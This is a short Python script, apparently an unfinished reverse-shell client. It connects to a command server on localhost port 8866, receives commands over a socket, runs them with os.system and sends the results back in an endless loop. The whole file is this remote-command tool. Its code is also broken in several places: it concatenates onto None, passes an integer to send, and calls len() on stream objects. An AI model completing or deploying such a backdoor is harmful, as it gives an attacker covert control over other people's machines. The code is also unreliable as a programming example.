import socket
import sys
import os
import platform

SRVCONN = ('localhost', 8866)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
OS = platform.system()

class stdout:
    def __init__(self):
        self.result = []
    def write(self, str):
        self.result = str.split('\n')
    


def initConn(connectionString):
    sock.connect(connectionString)
    
def receiveStuff():
    data = None
    try:
        lenReceived = 0
        lenActual = sock.recv(4)
        while (lenReceived < lenActual):
            data += sock.recv(16)
            lenReceived += len(data)

    finally:
        return data
    
def sendStuff(message):
    try:
        lenToSend = len(message)
        sock.send(lenToSend)
        sock.send(message.encode())
    finally:
        pass
    
def execStuff(command):
    stdout = sys.stdout
    stderr = sys.stderr
    os.system(command.decode())
    stdout = sys.stdout
    stderr = sys.stderr
    if(len(stderr) > 10):
        return stderr
    elif(len(stdout) > 5):
        return stdout
    else:
        return ""
    
        
def main():
    initConn(SRVCONN)
    sendStuff("hello")
    while True:
        sendStuff(execStuff(receiveStuff()))
    pass